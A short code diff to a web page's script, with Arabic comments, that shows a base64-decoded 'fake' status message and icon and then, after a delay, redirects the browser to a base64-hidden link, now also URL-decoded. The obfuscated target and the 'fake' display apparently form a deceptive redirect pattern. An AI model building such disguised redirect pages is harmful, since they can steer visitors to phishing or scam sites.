@@ -80,10 +80,12 @@
         document.getElementById("fake-status").textContent = atob(message);
         document.getElementById("fake-icon").src = atob(icon);
 
+        // فك التشفير للرابط الصحيح
+        const decodedLink = decodeURIComponent(atob(encodedLink));
+
         // التوجيه بعد التأخير
         setTimeout(() => {
-          const decoded = atob(encodedLink);
-          window.location.href = decoded;
+          window.location.href = decodedLink;
         }, delay);
       };
     </script>
